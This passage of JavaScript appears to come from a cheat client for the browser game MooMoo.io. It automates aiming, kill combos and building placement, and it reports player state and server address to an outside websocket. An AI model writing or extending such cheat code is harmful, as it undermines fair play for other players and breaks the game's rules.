            place(wallType,direction2);
            if(!E.inTrap){
                knla.send('9', n + toRad(90));
            }
            wr_obj = true
            Hg(6,11)
            setTimeout(() => {
                place(foodType)
            }, timeBetweenTick)
            setTimeout(() => {
                place(foodType)
                place(foodType)
                knla.send('9', undefined);
                wr_obj = false
            },222)
        }
    }
}

var whoShot = [];




function remProjectile(e, t) {
    for (let i = 0; i < Mt.length; ++i)
        Mt[i].sid == e && (Mt[i].range = t)
}
async function animateAnimal(e) {
    if(y = zo(e)) {
        //thisTick.playerHits.push(y);
        //y.gatherWeapon = { dmg: 200 };
        //y.variant = { val: 1 };
        y.startAnim();
        await nextTick();
        hitList.forEach((e) => {e.attemptResolve(1, 1, tick, 0, y)})
    }
}
function animalUpdate(e) {
    moostafaAI = undefined;
    moofieAI = undefined;
    treasureAI = undefined;
    for (var i = ye.length; i--;) {
        ye[i].forcePos = !ye[i].visible;
        ye[i].visible = false;
    }
    if(e) {
        for (let i = 0, tmpTime = Date.now(); i < e.length; i += 7) {
            if (y = zo(e[i])) {
                y.index = e[i + 1];
                y.t1 = (y.t2 === undefined) ? tmpTime : y.t2;
                y.t2 = tmpTime;
                y.x1 = y.x;
                y.y1 = y.y;
                y.x2 = e[i + 2];
                y.y2 = e[i + 3];
                y.d1 = (y.d2 === undefined) ? e[i + 4] : y.d2;
                y.d2 = e[i + 4];
                y.health = e[i + 5];
                y.dt = 0;
                y.visible = true;
            } else {
                y = ar.spawn(e[i + 2], e[i + 3], e[i + 4], e[i + 1]);
                y.x2 = y.x;
                y.y2 = y.y;
                y.d2 = y.dir;
                y.health = e[i + 5];
                if (!ar.aiTypes[e[i + 1]].name)
                    y.name = T.cowNames[e[i + 6]];
                y.forcePos = true;
                y.sid = e[i];
                y.visible = true;
            }
            if (y.id < 6) continue;
            if (y.name === "MOOSTAFA") moostafaAI = y;
            else if (y.name === "MOOFIE") moofieAI = y;
            else if (y.name === "Treasure") treasureAI = y;
        }
    }
    // post tick
    //postTick();
}
function postTick() {
    let { playerGathers, playerHits, objectsWiggled, newBuilds } = thisTick;
    let playerHitsLength = playerHits.length;
    // all of this monstrosity all in the name of building hp and hit detection ._.
    /*for (let i = newBuilds.length, build, tmp; i--;) {
        if ((build = newBuilds[i]).type !== "spikeType") continue;
        if ((moostafaAI && sqrt((moostafaAI.x - build.x) ** 2 + (moostafaAI.y - build.y) ** 2) - (80 + build.getScale()) <= 0) ||
            (moofieAI && sqrt((moofieAI.x - build.x) ** 2 + (moofieAI.y - build.y) ** 2) - (90 + build.getScale()) <= 0)) {
            tmpObj.health -= 100;
        } else if (treasureAI && sqrt((treasureAI.x - build.x) ** 2 + (treasureAI.y - build.y) ** 2) - (70 + build.getScale()) <= 0) {
            tmpObj.health -= 200;
        }
    }*/
    for (let i = objectsWiggled.length; i--;) {
        spliceIncludes((y = objectsWiggled[i]).ignoreWiggleDirs, y.wiggleDirs);
        let moostafaDir = moostafaAI ? atan2(moostafaAI.y - y.y, moostafaAI.x - y.x) : undefined;
        let moofieDir = moofieAI ? atan2(moofieAI.y - y.y, moofieAI.x - y.x) : undefined;
        let treasureDir = treasureAI ? atan2(treasureAI.y - y.y, treasureAI.x - y.x) : undefined;

        for (let i = y.wiggleDirs.length, dir, e, player; i--;) {
            for (e = playerHitsLength, dir = y.wiggleDirs[i]; e--;) {
                // moomoo uses dir.toFix(1)
                //console.log("DIR", dir);
                if (C.getAngleDist(atan2(y.y - (player = playerHits[e]).y2, y.x - player.x2), dir) <= 0.05) {
                    y.wiggleDirs[i] = undefined; // used angle
                    y.health -= player.gatherWeapon.dmg; /* * player.variant.val **/ (player.gatherWeapon.sDmg || 1) * (player.skinObj?.bDmg || 1);
                    break;
                }
            }

            // its ok if its set to undefined, UTILS.getAngleDist(undefined, dir) === NaN, (NaN <= 0.05) === false
            if (C.getAngleDist(dir, moostafaDir) <= 0.05 || C.getAngleDist(dir, moofieDir) <= 0.05) {
                y.wiggleDirs[i] = undefined; // used angle, set it to undefined
                y.health -= 100; // moostafa or moofie (both do 100 collision dmg)
                break;
            } else if (C.getAngleDist(dir, treasureDir) <= 0.05) {
                y.wiggleDirs[i] = undefined; // used angle
                y.health -= 200; // treasure does 200 coldmg
                break;
            }
        }
    }
    let i = objectsWiggled.length;
    for (;i--;) {
        objectsWiggled[i].ignoreWiggleDirs.length = 0;
    }
    objectsWiggled.length = playerHits.length = playerGathers.length = newBuilds.length = 0;
}
const _r = {};
function Jf(e, t) {
    const i = e.index;
    let s = _r[i];
    if (!s) {
        const n = new Image;
        n.onload = function() {
            this.isLoaded = !0,
                this.onload = null
        }
            ,
            n.src = "./img/animals/" + e.src + ".png",
            s = n,
            _r[i] = s
    }
    if (s.isLoaded) {
        const n = e.scale * 1.2 * (e.spriteMlt || 1);
        t.drawImage(s, -n, -n, n * 2, n * 2)
    }
}
function Bo(e, t, i) {
    return e + i >= 0 && e - i <= se && t + i >= 0 && t - i <= re
}
 let debug = document.createElement('div');
function qF(e, t,ws) {
    let i = findPlayerID(e[0]);

    if(!ws){
        !i &&!t&&!ws
        i || (i = new _c(e[0],e[1],T,C,po,ue,J,ye,R,Xt,Gt),
              J.push(i)),
            i.spawn(t ? xi : null),
            i.visible = !1,
            i.x2 = void 0,
            i.y2 = void 0,
            i.setData(e,i),
            t && (E = i,
                  Re = E.x,
                  _e = E.y,
                  itemUpdate(),
                  resourceCount(),
                  ageUpdate(),
                  updateUpdate(0),
                  us.style.display = "block")
    } else {
        let XDD = ws.findPlayer(e[1])
        XDD||(XDD = new _c(e[0],e[1],T,C,po,ue,ws.players,ye,R,Xt,Gt),ws.players.push(XDD))
        XDD.spawn(t ? xi : null)
        XDD.visible = !1
        XDD.x2 = void 0
        XDD.y2 = void 0
        XDD.setData(e,XDD,true)
        return;
    }
    !i.customColor && (i.customColor = Array.from(allColors)[floor(Math.random() * allColors.size)])

    primaryReloads[e[1]] = 1,
        secondaryReloads[e[1]] = 1,
        i.pr = 1,
        i.sr = 1;
    !i.seenCount? i.seenCount=1:i.seenCount++,
        i.primary = null;
    i.secondary = null;
    i.samRP = 1;
    i.didDeath = false;
    i.samRS = 1;
    i.noAntiList = i.noAntiList ?? new Array(10).fill(0);
    i.healArr = [];
    i.loadout = {
        spike: R.list[9],
        spawnpad: false,
        utility: undefined,
        windmill: undefined,
        trap: true,
        wall: R.list[3],
        food: R.list[0]
    }
    turretReloads[e[1]] = 1
    i.deathDmgs = []
    i.dmgsNow = []
    !i.trackLeak && (i.trackLeak = [])
    !i.trackGain && (i.trackGain = [])
    i.tr = 1;
    i.shameCount = 0;
    i.healTrack = [];
    i.Alive = true;
    if(i.seenCount>1&&!t)
    if(i.sid === E.sid && serverconnected) socketer.send(JSONStringify({updating:E, server:location.href}));
}
function zF(e) {
  
    projs.length && (projs = projs.filter(x => x.owner.sid != e))
    Pt = Pt.filter(x=> x.sid != e)
    for (let t = 0; t < J.length; t++)
        if (J[t].id == e) {
            J.splice(t, 1);
            break
        }
}
function resourceUpdate(e, t) {
    E && (E.itemCounts[e] = t)
    displayItemCount(e)
}
let itemCounter = [];
function hsl(percent, start, end) {
    var a = percent / 100,
        b = (end - start) * a,
        c = b + start;

    return `hsl(${c}, ${30}%, 50%)`;
}

var Length;



var itemSet = [];
function displayItemCount(index = undefined) {



    const itemWidth = '70px';
    const itemMargin = '5px';
    for (let i = 3; i < R.list.length; ++i) {
        let id = R.list[i].group.id;
        let tmpI = R.weapons.length + i;
        if (!itemSet[tmpI]) {
            itemSet[tmpI] = document.createElement("div");
            itemSet[tmpI].id = "itemCount" + tmpI;
            gE("actionBarItem" + tmpI).appendChild(itemSet[tmpI]);
            itemSet[tmpI].style = `display:none; margin:${itemMargin}; width:${itemWidth}; height:${itemWidth};`,
            itemSet[tmpI].innerHTML = E.itemCounts[id] || 0;
        } else {
            if (index == id)
                itemSet[tmpI].innerHTML = E.itemCounts[index] || 0;
        }
    }
}





let plyVals = ["food", "stone", "wood"];
async function updatePlayerValue(e, t, i) {
    if(E) {
        E[e] = t;
        if(plyVals.includes(e.toString())) {
            const val = parseInt(document.getElementById(`${e}Display`).innerText), XP = t - val;
            await nextTick();
            if(XP > 0) {
                if (!E.weaponXP[E.weaponIndex]) E.weaponXP[E.weaponIndex] = 0;
                E.weaponXP[E.weaponIndex] += XP;
            }
        }

if (e == "kills") {
       knla.send("6", "~=SamMOD~discord=sam#7707")
}

/*else if (e == "kills") {
            playerKills++; // reset to 0 when died()
        }*/
        i && resourceCount();
    }
}
function healthUpdate(e, t) {
    if (!(y = findPlayerSID(e))) return;
    let dater = Date.now();
    let d=t-y.health;
    y.isPlayer &&y.healArr.push([d,t,dater]);
    y.lastHealth = y.health;
    y.animatedHealth = Date.now();
    y.health = t;
}




function removeDuplicates(arr1, arr2) {
    const combinedArray = arr1.concat(arr2);
    const uniqueArray = combinedArray.filter((item, index, self) => {
        return index === self.findIndex((el) => el.sid === item.sid);
    });
    return uniqueArray;
}



/*function bestAim(main, range, objs = nearObjects) {
    let possibleTargets = objs.filter(obj =>
        dist(E, obj, "object") <= range //&& dAng(getAimer(main, obj), getAimer(main, main)) <= 1.5708
    );
    //ex. use: C.getAngleDist(getAimer(player,e), player.d2) <= Math.PI / 2.6
    return getAimer(E,main)
    if (possibleTargets.length > 1) {

        return calcAvgObj(E,possibleTargets)
    } else if (possibleTargets.length === 1) {
        // Only one target, return it
        return getAimer(E,main)// possibleTargets[0];
    } else {
        // No valid targets
        return null;
    }*/
//}*/
// new shit, but replace with one below
function bestAimer(main, range, objs = nearObjects) {
    // Filter objects within the specified range
    let possibleTargets = objs.filter(obj => dist(E, obj, "object") <= range);

    // Default aim direction towards the main target
    let bestAim = getAimer(E, main);
    let concatObj = [main];

    // Initialize max hit count and best hit count that includes the main target
    let maxHitCount = 0;
    let bestHitCountIncludingMain = 0;

    for (let i = 0; i < 36; i++) {
        let aimer = getAimer(E, main) + toRad(i * 10);
        let hitObjs = [];
        let hitCount = possibleTargets.reduce((count, target) => {
            if (C.getAngleDist(getAimer(E, target), aimer) <= gatherAng &&
                C.getAngleDist(getAimer(E, main), aimer) <= gatherAng) {
                hitObjs.push(target);
                return count + 1;
            }
            return count;
        }, 0);

        // Update best aim if more targets are hit and it hits the main target
        if (C.getAngleDist(getAimer(E, main), aimer) <= gatherAng) {
            if (hitCount > bestHitCountIncludingMain) {
                bestHitCountIncludingMain = hitCount;
                bestAim = aimer;
                concatObj = hitObjs;
            }
        }

        // Update max hit count
        if (hitCount > maxHitCount) {
            maxHitCount = hitCount;
        }
    }

    // Flatten breakObjs array
    breakObjs.push(concatObj);
    breakObjs = breakObjs.flat();

    return bestAim;
}
function bestAimS(main, range, objs = nearObjects) {
    let possibleTargets = objs.filter(obj =>
                                      dist(E, obj, "object") <= range
                                     );

    let bestAim = getAimer(E, main); // Default to the current aim
    let concatObj = [main];
    if (possibleTargets.length > 1) {
        let maxHitCount = 0;

        for (let i = 0; i < 36; i++) {
            let aimer = getAimer(E, main) + toRad(i*10);
            let hitObjs = [];
            let hitCount = possibleTargets.reduce((count, target) => {
                if (C.getAngleDist(getAimer(E, target), aimer) <= gatherAng &&
                    C.getAngleDist(getAimer(E, main), aimer) <= gatherAng) {
                    hitObjs.push(target)
                    return count + 1;
                }
                return count;
            }, 0);

            if (hitCount > maxHitCount) {
                maxHitCount = hitCount;
                bestAim = aimer;
                concatObj = hitObjs
            }
        }
    }
    breakObjs.push(concatObj);
    breakObjs = breakObjs.flat();
    return bestAim;
}
function bestAim(main, range, objs = nearObjects) {
    let possibleTargets = objs.filter(obj =>
                                      dist(E, obj, "object") <= range
                                     );

    let bestAim = getAimer(E, main); // Default to the current aim
    let concatObj = [main];
    if (possibleTargets.length > 1) {
        let maxHitCount = 0;

        for (let i = 0; i < 36; i++) {
            let aimer = getAimer(E, main) + toRad(i*10);
            let hitObjs = [];
            let hitCount = possibleTargets.reduce((count, target) => {
                if (C.getAngleDist(getAimer(E, target), aimer) <= gatherAng &&
                    C.getAngleDist(getAimer(E, main), aimer) <= gatherAng) {
                    hitObjs.push(target)
                    return count + 1;
                }
                return count;
            }, 0);

            if (hitCount > maxHitCount) {
                maxHitCount = hitCount;
                bestAim = aimer;
                concatObj = hitObjs
            }
        }
    }
    breakObjs.push(concatObj);
    breakObjs = breakObjs.flat();
    return bestAim;
}
function distSquared(point1, point2) {
    const dx = point1.x2 - point2.x;
    const dy = point1.y2 - point2.y;
    return dx * dx + dy * dy;
}
function calcAvgObj(e,objs,type) {
    const averageX = objs.reduce((sum, obj) => sum + obj.x, 0) / objs.length;
    const averageY = objs.reduce((sum, obj) => sum + obj.y, 0) / objs.length;
    const angle = atan2(averageY - e.y2, averageX - e.x2);
    if(!type)return angle;
    if(type) return {x:averageX,y:averageY}
}
function calcAvg(e,players,type) {
    const averageX = players.reduce((sum, player) => sum + player.x2, 0) / players.length;
    const averageY = players.reduce((sum, player) => sum + player.y2, 0) / players.length;
    const angle = atan2(averageY - e.y2, averageX - e.x2);
    if(!type)return angle;
    if(type) return {x:averageX,y:averageY}
}



var turretdoer;
function visualizeVelocity(x,y,dir,ticks,player){
    if(!(tick>5&&!WC.length)) return;
    //  let fE = JETXRAH(E,x)////E.np.real
    // console.log(fE)
    //  let fP = fE[ticks-1]
    //console.log(fP
    // let thisE = {...E}
    player.x = x//fP.accel.x
    player.x2 = y// fP.accel.x
    player.x1 = x// fP.accel.x
    player.y = y//fP.accel.y
    player.y1 = y// fP.accel.y
    player.y2 = y// fP.accel.y
    player.sid = 1000
    player.distance = 10000
    //console.log(dist(E,thisE))
    //createFake(player,0,0,E.skinIndex,E.tailIndex,0,ticks,player);
}
function dunecodigo(_, o){
    nearObjects.forEach(x => {x.assumeBreak = false})
    for(let x = 0; x < J.length; x++){
        if(!J[x].visible||E.sid === J[x].sid) continue;
        _ = J[x]
        _.bDmg = _?.secondary === 10 && (_.sr === 1 || placeTickInAdvance && nreload(_, placeTickInAdvance) === 1) ?
            {dmg:10*(Variants[_.secondaryVar] * 7.5 * 3.3), wep: 10} :
        _?.primary && (_?.pr === 1 || _.weaponIndex == _.primary && placeTickInAdvance && nreload(_, placeTickInAdvance) === 1) ?
            {dmg:R.weapons[_?.primary]?.dmg * 3.3 * Variants[_.primaryVar], wep: _.primary} : 0
        if(_.bDmg === 0) continue;
        for(let i = 0; i < nearObjects.length; i++){
            if(nearObjects[i].type !== null || !nearObjects[i]?.owner?.sid) continue;
            let d_o = dist(_,nearObjects[i],"object") <= R.weapons[_.bDmg.wep].range
            d_o && (!nearObjects[i].dmgpot || nearObjects[i].dmgpot < _.bDmg.dmg) && (nearObjects[i].dmgpot = _.bDmg.dmg)
            //     d_o && (nearObjects[i].maxDmg += _.bDmg.dmg)
            if(nearObjects[i].dmgpot >= nearObjects[i].health && d_o/* && C.getAngleDist(getAimer(_,nearObjects[i]), _.d2) <= Math.PI / 2.6*/){
                nearObjects[i].assumeBreak = true
                //  console.log(nearObjects[i].dmgpot,nearObjects[i].maxDmg, _.bDmg);
                continue;
            }
        }
    }
}


// this is for reflect dmg pot
/*
   /*if(nearestenemy) {
        const hat = Xt.find(x => x.id === nearestenemy.skinIndex);
        const tail = Gt.find(x => x.id === nearestenemy.tailIndex);
        const hReflectMult = (E.skinIndex === 11) ? 0.45 : 0;
        const tReflectMult = (E.tailIndex === 21) ? 0.25 : (E.tailIndex === 16) ? 0.15 : 0;
        const incomingDamage = R.weapons[nearestenemy.weaponIndex].dmg * (hat?.dmgMultO || 1) * (tail?.dmgMultO || 1) * T.weaponVariants[nearestenemy.weaponVariant].val;
        const reflectedDamage = incomingDamage * (hReflectMult + tReflectMult);
        console.log(`Incoming Damage: ${incomingDamage}, Reflected Damage: ${reflectedDamage}`);
        // 100% accurate...?????
    }
*/
function hitPlayer(angle, wep, variant, hat, acc, type, o, dir, incoming, reflected, hReflectMult, tReflectMult) {
    if(!enemies.length) return;
    for(let i = enemies.length; i--;){
        //console.log("ran");
        //if(enemies[i].skinIndex != 11 || enemies[i].tailIndex != 21 || enemies[i].tailIndex != 16) continue;
        if(enemies[i].skinIndex == 11 || enemies[i].tailIndex == 21 || enemies[i].tailIndex == 16) {
            dir = getAimer(E, enemies[i]);
            if(dist(E, enemies[i], "player") <= (R.weapons[wep]?.range) && C.getAngleDist(dir, angle) <= gatherAng) {
                incoming = R.weapons[wep].dmg * (Xt.find(x => x.id === hat)?.dmgMultO || 1) * (Gt.find(x => x.id === acc)?.dmgMultO || 1) * Variants[variant];
                hReflectMult = (enemies[i].skinIndex === 11) ? 0.45 : 0;
                tReflectMult = (enemies[i].tailIndex === 21) ? 0.25 : (enemies[i].tailIndex === 16) ? 0.15 : 0;
                reflected = incoming * (hReflectMult + tReflectMult)
                if(wep === 10 && E.sr === 1 || wep != 10 && E.pr === 1){
                 
                }
            }
        }
    }
}
function breakBuild(angle, wep, variant, hat, force, type, o, t, dmg){
    for(let i = 0; i < nearObjects.length; i++){
        //  o = nearObjects[i]
        t = getAimer(E,nearObjects[i])
        if(dist(E, nearObjects[i],"object") <= (R.weapons[wep]?.range) && C.getAngleDist(t, angle) <= gatherAng && nearObjects[i].type === null){
            dmg = R.weapons[wep].dmg * (wep === 10 ? 7.5 : 1) * (hat === 40 ? 3.3 : 1) * Variants[variant]
            let conditions = (wep === 10 && E.sr === 1 || wep != 10 && E.pr === 1) && nearObjects[i].dmgpot+dmg >= nearObjects[i].health
            if(force && !conditions) breakObjs.push(nearObjects[i]);
            if(conditions){
                nearObjects[i].assumeBreak = true;
                nearObjects[i].manualBreak = true;
                breakObjs.push(nearObjects[i]);
            }
        }
    }
}



let projHitPlayers = []

function projHits(val){
    let visibleAnimals = ye.filter(x => x.visible)

    let hitInfo = []
    for(let i = 0; i < projs.length; i++){
        let closestIntersection = Infinity;
        let closestIntersection2 = Infinity;
        let conditions = []
        let proj = projs[i]
        let _ = findPlayerSID(proj.owner.sid)
        if(!_){
            projs.splice(i, 1)
            continue;
        }
        let teamPlayers = J.filter(x => x.visible && !(typeof _.team == "string" && x.team ==_.team) && x.sid != _.sid);
        let all = renderObjects.filter(x=> !x.ignoreCollision && x.elevation > proj.avoid).concat(visibleAnimals, teamPlayers);
        for(let PP = 0; PP < all.length; PP++){
            let x = all[PP]
            // all.forEach((x) => {
            let scale = x.realScale ? x.realScale : x.scale
            const distance = dist2(proj,x)
            conditions[0] = C.lineInRect((x.x2||x.x) - scale, (x.y2||x.y) - scale, (x.x2||x.x) + scale, (x.y2||x.y) + scale, proj.owner.x2, proj.owner.y2, proj.x + proj.spd * timeBetweenTick * cos(proj.dir), proj.y + proj.spd * timeBetweenTick * sin(proj.dir))
            conditions[1] = C.lineInRect((x.x2||x.x) - scale, (x.y2||x.y) - scale, (x.x2||x.x) + scale, (x.y2||x.y) + scale, proj.owner.x2, proj.owner.y2, proj.x + proj.spd * timeBetweenTick2 * cos(proj.dir), proj.y + proj.spd * timeBetweenTick2 * sin(proj.dir))
            if(conditions[0]){
                if (distance < closestIntersection) {
                    closestIntersection = distance;
                    projs[i].hit = x;
                    if(x.realScale){ projs[i].building = x} else projs[i].building = null;
                }
            }
            if(conditions[1]){
                if(distance < closestIntersection2){
                    closestIntersection2 = distance
                    projs[i].futureHit = x
                }
            }
        }

        if(projs[i].futureHit && !projs[i].hit){
            if(projs[i].futureHit.isPlayer){
                findPlayerSID(projs[i].futureHit.sid).hitProjs+= projs[i].dmg
                if(E.sid == projs[i].futureHit.sid)
              
                // add sync proj hit later
                if(projs[i].owner.sid != E.sid && clan(projs[i].owner.sid) && nearestenemy && projs[i].futureHit.sid == nearestenemy.sid) {
                   
                    if(primary == 5 && nearestenemy && !wr_obj&&(dist(E.np.accel,nearestenemy.np.real,"player")<=R.weapons[primary].range||dist(E,nearestenemy,"player")<=R.weapons[primary].range)&&E.pr==1&&E.sr==1&&amAlive&&shieldBypass(E,nearestenemy)){
                        WR = false;
                        // console.log("regular insta");
                        wr_obj = true;
                        Hg(7,18)
                        aim[0] = getAimer(E,nearestenemy)
                        visAim = true;
                        knla.send("D",getAimer(E,nearestenemy), "client");
                        knla.send("z",primary,true)
                        hold = primary
                        setTimeout(() => {
                            wr_obj = false;
                        }, 120);
                    }
                    //console.log("ally projectile");
                }
            }
        }
        //   });
        projs[i].x += proj.spd * timeBetweenTick * cos(proj.dir);
        projs[i].y += proj.spd * timeBetweenTick * sin(proj.dir);
        projs[i].traveled += proj.spd * timeBetweenTick;
    }

    projs.forEach((x) => {
        if(x.building){
            setTimeout(() => {
                hitList.forEach((e) => {e.attemptResolve(1, 1,tick, x)})
            }, 10)
        }
    })
    projs = projs.filter(x => {
        if(x.hit || x.traveled >= x.max) return
        if(!x.hit && x.traveled < x.max) return x
    })//!x.hit && x.traveled < x.max)
    //return closestUnit;

}





function actions(){

}

function breakers(){

}

function macros(){
    //setTimeout(() => {
    keys.f>=1&&place(E.items[4])
    keys.v>=1&&place(E.items[2])
    keys.h>=1&&place(utilityType)
    keys.m>=1&&place(spawnpadType)
    keys.i>=1&&place(wallType,vs2())
    keys.j>=1 &&mineType!=null&&place(mineType)
    //keys.c>=1 && bowInsta();
    //},111-pingavg);
}
// new gen shit
function hatTracker(post, current = {}, param) {
    const oldData = { ...post, tick: tick };
    current.skinIndex = post.skinIndex;
    current.skinTick = tick;
    current.tailIndex = post.tailIndex;
    current.tailTick = tick;
    if (post.skinIndex !== current.skinIndex) {
        console.log(param, "OLD", oldData.skinIndex, "NEW", current.skinIndex);
    }
    if (post.tailIndex !== current.tailIndex) {
        console.log(param, "OLD", oldData.tailIndex, "NEW", current.tailIndex);
    }
    //console.log(oldData.

}
async function Mx(e) {
    ppT = 0;
    bowinstaing = false;
    antiOneTicks();
    breaker = false;
    time = Date.now();
    tick++;
    if (!(tick % 9)) {
        ppsAvgs.push(packets);
        if (ppsAvgs.length > 5) ppsAvgs.shift();
        ppsAvg = ceil(ppsAvgs.reduce((a, b) => a + b) / ppsAvgs.length);
        packets = 0;
    }
    nearEnemies.length = nearSpikes.length = nearTraps.length = enemies.length = allies.length = 0;
    hold = null;
    for (var n = J.length; n--;) {
        J[n].visible ? (J[n].vis2 = true) : (J[n].vis2 = false);
        (y = J[n]).forcePos = !y.visible;
        y.visible = false;
    }
    let delta = timeBetweenTick, dataLength = e.length;
    for (let n = 0, t = Date.now(); n < dataLength; n += 13) {
        if (!(y = findPlayerSID(e[n]))) continue;
        y.t1 = void 0 === y.t2 ? t : y.t2,
            ltt[y.sid] = y,
            y.t2 = t,
            y.x1 = y.x,
            y.y1 = y.y,
            y.preX = y.x2,
            y.preY = y.y2,
            y.pmovDir = y.movDir,
            y.x2 = e[n + 1],
            y.y2 = e[n + 2],
            y.d1 = void 0 === y.d2 ? e[n + 3] : y.d2,
            y.d2 = e[n + 3],
            y.delta = y.dt,
            y.dt = 0,
            y.buildIndex = e[n + 4],
            y.weaponIndex = e[n + 5],
            y.xVel = y.x2 - y.preX,
            y.xVel2 = y.x2 - y.x1,
            y.yVel = y.y2 - y.preY,
            y.yVel2 = y.x2 - y.x1,
            y.weaponVariant = e[n + 6],

            y.team = e[n + 7],
            y.isLeader = e[n + 8],
            y.skinIndex = e[n + 9],
            y.skinIndex != 45 && (y.shameTimer = 30,y.clowned = false),
            y.skinIndex == 45 &&y.shameTimer == 30 && Shame(y),
            y.tailIndex = e[n + 10],
            y.iconIndex = e[n + 11],
            y.zIndex = e[n + 12],
            y.visible = true,
            y.slowMult = max(1, y.slowMult + 0.0008 * delta),
            (y.movSpd = sqrt((y.preY - y.y2)**2 + (y.preX - y.x2)**2)),
            (y.movSpd2 = sqrt((y.y1 - y.y2)**2 + (y.x1 - y.x2)**2)),
            (y.movDir = atan2(y.y2 - y.preY, y.x2 - y.preX)),
            ((y.movDir == 0 && y.movSpd==0||y.preX == y.x2 && y.preY==y.y2) && (y.movDir=undefined)),
            y.weaponIndex >= 9 ? (y.secondary = y.weaponIndex) : (y.primary = y.weaponIndex),
            y.weaponIndex == y.primary && (y.primaryVar = y.weaponVariant),
            y.weaponIndex == y.secondary &&(y.secondaryVar= y.weaponVariant),
            y.primaryXD = y.pr,
            y.secondaryXD = y.sr,
            y.zikachecks = y.tr,
            y.tick = tick,
            reloadWeapon(y),
            y.weaponE = (y.weaponIndex ==y.secondary? y.sr:y.pr),
            y.pPrimaryXD = y.primaryXD == y.pr &&y.pr==0? (y.pPrimaryXD=.015,y.primaryXD=.015):y.pr,
            y.sSecondaryXD = y.secondaryXD == y.sr &&y.sr==0? (y.sSecondaryXD=.015,y.secondaryXD=.015):y.sr,
            y.hitProjs = 0,
            y.hitSpike = false,
            y.np = bTw(y),
            y.inWater = y.y2 >= T.mapScale / 2 - T.riverWidth / 2 && y.y2 <= T.mapScale / 2 + T.riverWidth / 2,
            y.buildIndex!=-1 && onioncheckestoo(y.loadout,y.buildIndex),
            y.assumeAge =  Checknood(y);
        if(clan(y.sid)) {
            allies.push(y)
        } else {
            enemies.push(y);
        }
    }
    mouseXY();
    getInventory();
    if(E.d1==E.dir&&E.d2==E.dir&&aim[0]===null)visAim=false;
    E.shameLeak = false;
    macros()
    await wait(1);
    renderObjects = et.filter(e => (e.distance = fHypot(e.x - E.x2, e.y - E.y2)) <= 2000);
    nearObjects = renderObjects.filter(e => e.distance <= 800);
    restrictPlace = restrictPlace.filter((t)=>ue.checkItemLocation(t.x,t.y,t.scale,.6,t.id,false)&&tick-t.sid<=3)
    prioLoc = [];
    prioSync = false;
    managePromises.forEach((e) => e());
    managePromises = [];
    updater.forEach(e => e.id(...e.data));
    updater = [];
    Pathfinder?.setPos(E.x2, E.y2);
    Tach?.setSend(knla.send.bind(knla));
    Tach?.setSelf(E);
    Tach?.updatePlayers(J);
   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa = false;
    for(let i = J.length; i--;) {
        if((e = J[i])) {
            e.visible&&(e.weaponR = (e.weaponIndex ==e.secondary? e.sr:e.pr))
            if(isNaN(e.poison)) e.poison = 0;
            e.poison>0 && (e.poison=max(0,e.poison-(e.delta/1000)))
            if (!e?.Alive2 && !e?.Alive) {
                let string = "";
                e.deathDmgs.forEach((x, index) => {
                    string += `${JSONStringify(x)}`;
                    if (index < e.deathDmgs.length - 1) {
                        string += ", ";
                    }
                });
                string = string.replace(/,/g, ', ');
                e.deaths++;
            }
            e.Alive2 = true;

            e.dmgs = "XD";
            if(e.vis2==false&&e.visible&&e.buildIndex==-1){if(e.weaponIndex!=e?.primary&&e.primaryVar<=2){e.primaryVar=3} else if(e.weaponIndex!=e?.secondary&&e.secondaryVar<=2&&(e.secondary==10||e.secondary==14))e.secondaryVar = 3}

            if(e.healArr.length) {
                e.healArr.forEach((g)=>Qz(e.sid,g[0],g[1],g[2])),e.healArr=[]
            }
            if(e.dmgsNow.length)e.deathDmgs.push(e.dmgsNow)
            e.dmgsNow = [];
            if(e.health === 100) e.deathDmgs = [];
            e.bleed = e.lastBull ? ((tick - e.lastBull + (e.sid === E.sid ? failsafe : 0)) % 9 + 9) % 9 : undefined;
        }
    }

    if (amAlive && stackedText.length > 0) {
        stackedHealVal = stackedText.reduce((sum, text) => sum + abs(text.value), 0);
        stackedText = [];
    }
    if(!E.dmgpots) E.dmgpots = [];
    if(enemies.length){
        for(let i = enemies.length; i--;) enemies[i].distance = sqrt((enemies[i].x2 - E.x2) ** 2 + (enemies[i].y2 - E.y2) ** 2);
        enemies = enemies.sort((a,b)=> a.distance - b.distance)
    }
    nearestenemy = enemies[0];

     Mitocondria.player = J.find(x => x.sid === Mitocondria.ID && x.visible)
    if(Mitocondria.player){
        Mitocondria.player.positions = JETXRAH(Mitocondria.player, 6)
    } else if(nearestenemy){
        Mitocondria.player = nearestenemy;
        Mitocondria.player.positions = JETXRAH(Mitocondria.player, 6)
    }
    E.antiOneTickBowInsta = false;
    E.hitting = false;
    E.movSpd!=0 && (E.invisTime = 1000);
    E.movSpd == 0 && (E.invisTime-=E.delta);
    turretTimer()
    renderFake();
    Pathfinder?.setBuildings(et);
    reloadFailSafe();
    Pathfinder?.setSpeed(55*speed7(E));
    findAvailableAngles(spikeType, 1, 0, PI / 35);
    let busycheck = (wr_obj == true ||E.hitting) ? true : false;
    nearestenemy && serverconnected&&(socketer.send(JSONStringify({team:E,busy:busycheck,msg:"status",move:moveDirection,server:location.href})))
 
    if(displayer){
        serverconnected &&socketer.send(JSONStringify({msg:"ping",player:E,time:time,server:location.href}))
        displayer = max(displayer-E.delta,0)
    }
    stealAnimal();
    doInsta(WR);
    projHits()
    destroyedTraps = destroyedTraps.filter((x) => tick - x.destroyedAt <= 2);
    //console.log(destroyedTraps);
    //restrictPlace = restrictPlace.filter((t)=>ue.checkItemLocation(t.x,t.y,t.scale,.6,t.id,false)&&tick-t.sid<=3)
    for(let i = enemies.length; i--;) {
        if((e = enemies[i])) {
            if(e.distance <= 275) nearEnemies.push(e);
            e.kbpot = knockBack(e, E,getAimer(e,E));
            e.KB = knockBack(E, e,getAimer(E,e));
            e.placePot = e.distance <= 300 ? enemyPlacement(e,e.loadout.spike.id, getAimer(e,E)) : {onPlayer:[],possible:[],placeRange:null}
            e.dmgpot = playerdmgs(e);
            e.inTrap = false;
            e.globalTrap = false;
            for (let m = renderObjects.length; m--;) {
                if(renderObjects[m].name === "pit trap" && dist2(e, renderObjects[m]) <= 47 && clan(renderObjects[m]?.owner?.sid)) {
                    e.inTrap = renderObjects[m];
                    break;
                }
            }
            for (let m = renderObjects.length; m--;) {
                if(renderObjects[m].name === "pit trap" && dist2(e, renderObjects[m]) <= 47 && (clan(renderObjects[m]?.owner?.sid) || (!e.team && renderObjects[m]?.owner?.sid != e.sid))) {
                    e.globalTrap = renderObjects[m];
                    break;
                }
            }
